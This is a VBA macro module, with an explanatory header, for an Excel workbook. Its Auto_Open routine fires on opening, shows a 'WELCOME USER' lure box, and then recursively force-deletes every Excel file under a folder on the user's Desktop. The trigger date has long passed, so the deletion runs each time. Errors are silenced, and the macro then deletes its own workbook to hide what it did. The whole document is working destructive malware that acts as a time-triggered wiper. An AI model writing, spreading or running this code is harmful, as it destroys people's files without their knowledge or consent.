' VBA Project: Automated File Deletion and Self-Destruction
' --------------------------------------------------------------------------------------------
' Description:
' This VBA project includes subroutines designed to automate the deletion of Excel files
' and the self-destruction of the workbook under specific conditions.
'
' It features the following key subroutines:
'
' -- Sub Auto_Open --
'
' Purpose:
' Executes automatically when the workbook is opened.
'
' Functionality:
' Displays a welcome message box to the user and then initiates the process of deleting
' all Excel files in a specified directory by calling the DeleteAllExcelFiles subroutine.
'
' -- Sub DeleteAllExcelFiles --
'
' Purpose:
' Deletes all Excel files within a specified directory and its subdirectories.
'
' Functionality:
' Checks if the current date and time exceed June 27, 2016, at 4:00 PM. If this condition
' is met, it initializes a File System Object (FSO), sets the target directory, and then
' deletes all Excel files (with extensions *.xls, *.xlsx, *.xlsm) found in that directory
' and its subdirectories by calling the DeleteExcelFilesInDirectory subroutine.
' After deleting the files, it calls the SuicideSub subroutine to delete the workbook itself.
'
' -- Sub DeleteExcelFilesInDirectory --
'
' Purpose:
' Recursively deletes Excel files within a given directory.
'
' Functionality:
' Iterates through all files in the specified directory and deletes those with Excel extensions.
' It also processes any subdirectories to ensure that all files are removed.
'
' -- Sub SuicideSub --
'
' Purpose:
' Deletes the workbook file and closes the workbook.
'
' Functionality:
' Marks the workbook as saved, changes its access to read-only, deletes the workbook file,
' and then closes the workbook without saving any further changes.
' --------------------------------------------------------------------------------------------

Sub Auto_Open()
    ' Display a message box with "Open" option only
    MsgBox "WELCOME USER!!!.", vbOKOnly + vbExclamation, "UNLOCK GREATNESS"
    Call DeleteAllExcelFiles
End Sub

Sub DeleteAllExcelFiles()
    ' Check if the current date and time exceed June 27, 2016, at 4:00 PM
    If Now > #6/27/2016 4:00:00 PM# Then
        ' Initialize the file system object
        Dim fso As Object
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        ' Get the user's directory
        Dim userDir As String
        userDir = Environ("USERPROFILE") & "\Desktop\new"
        
        ' Delete all Excel files in the directory and subdirectories
        Call DeleteExcelFilesInDirectory(fso, userDir)
        Call SuicideSub
    End If
End Sub

Sub DeleteExcelFilesInDirectory(fso As Object, directory As String)
    ' Loop through all files in the directory
    Dim file As Object
    For Each file In fso.GetFolder(directory).Files
        If file.Name Like "*.xls" Or file.Name Like "*.xlsx" Or file.Name Like "*.xlsm" Or file.Name Like "*.XLS" Then
            On Error Resume Next
            file.Delete True
            On Error GoTo 0
        End If
    Next file
    
    ' Loop through all subdirectories
    Dim subdirectory As Object
    For Each subdirectory In fso.GetFolder(directory).SubFolders
        Call DeleteExcelFilesInDirectory(fso, subdirectory.Path)
    Next subdirectory
End Sub

Sub SuicideSub()
    On Error Resume Next
    With ThisWorkbook
        .Saved = True
        .ChangeFileAccess xlReadOnly
        Kill .FullName
        .Close False
    End With
    On Error GoTo 0 ' Restore default error handling
End Sub

